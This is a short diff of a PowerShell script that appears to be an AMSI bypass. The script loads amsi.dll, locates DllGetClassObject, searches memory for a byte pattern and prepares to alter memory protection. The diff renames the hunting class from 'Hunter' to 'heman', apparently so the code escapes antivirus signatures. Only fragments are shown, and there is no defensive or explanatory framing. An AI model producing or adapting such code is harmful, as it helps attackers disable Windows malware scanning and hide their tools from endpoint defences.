@@ -1,4 +1,4 @@
-Class Hunter {
+Class heman {
     static [IntPtr] FindAddress([IntPtr]$mickey, [byte[]]$tom) {
         while ($true) {
             [int]$count = 0
@@ -112,7 +112,7 @@ $hModule = $LoadLibrary.Invoke("amsi.dll")
 Write-Host "[+] AMSI DLL Handle: $hModule"
 $DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
 Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
-[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
+[IntPtr]$targetedAddress = [heman]::FindAddress($DllGetClassObjectAddress, $egg)
 Write-Host "[+] Targeted address: $targetedAddress"
 
 $oldProtectionBuffer = 0
